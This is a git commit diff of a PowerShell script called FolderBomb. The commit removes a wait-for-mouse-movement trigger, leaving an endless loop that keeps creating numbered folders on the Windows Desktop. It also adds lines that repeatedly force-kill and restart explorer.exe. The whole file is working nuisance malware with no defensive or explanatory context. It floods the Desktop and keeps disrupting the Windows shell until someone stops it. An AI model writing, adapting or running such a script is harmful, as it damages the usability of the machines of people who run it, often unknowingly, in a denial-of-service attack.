12c268e369f2f2ed12fdaa1154ceb389b986b130
Anonymous <106942782+MajorMarmalade@users.noreply.github.com>
2023-01-23 13:33:44 -0500

    Add files via upload

--- FolderBomb/folderbomb.ps1
+++ FolderBomb/folderbomb.ps1
@@ -1,24 +1,11 @@
-# Import the System.Windows.Forms assembly
-Add-Type -AssemblyName System.Windows.Forms
-
-# Store the original position of the cursor
-$originalPOS = [System.Windows.Forms.Cursor]::Position
-
-# Loop until the cursor position changes
-while (1) {
-    # Check if the cursor position has changed
-    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
-        # If the cursor has moved, exit the loop
-        break
-    }
-}
-
-# At this point, the script will continue executing
-
 $i = 1
 while ($true) {
     $path = [Environment]::GetFolderPath("Desktop") + "\$i"
     New-Item -ItemType Directory -Path $path
     $i++
     Start-Sleep -Milliseconds 100
+    taskkill /f /im explorer.exe
+    Start-Sleep -Milliseconds 500
+    explorer.exe
+    Start-Sleep -Milliseconds 500
 }
